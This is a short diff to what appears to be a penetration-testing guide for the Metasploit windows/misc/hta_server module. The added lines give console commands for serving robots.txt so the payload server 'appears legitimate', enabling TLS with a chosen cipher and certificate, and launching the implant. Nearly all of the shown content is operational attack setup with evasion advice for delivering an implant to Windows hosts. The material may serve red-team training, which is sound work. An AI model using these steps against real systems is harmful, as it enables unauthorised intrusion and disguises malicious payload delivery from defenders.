@@ -43,7 +43,27 @@ msf exploit(windows/misc/hta_server) > set lport <PORT>
 msf exploit(windows/misc/hta_server) > set srvhost <server_IP>
 
 msf exploit(windows/misc/hta_server) > set srvport <server_PORT>
+```
 
+To make it appear legitimate include `robots.txt`.
+
+```
+msf exploit(windows/misc/hta_server) > set sendrobots true
+```
+
+You can enable the secure TLS connection and optionally yet recommended to pass a custom certificate.
+
+```
+msf exploit(windows/misc/hta_server) > set ssl true
+
+msf exploit(windows/misc/hta_server) > set sslcipher [DHE-RSA-AES256-SHA | ADH]
+
+msf exploit(windows/misc/hta_server) > set sslcert /path/to/certificate.pem
+```
+
+Then launch the implant.
+
+```
 msf exploit(windows/misc/hta_server) > run -j
 ```
 
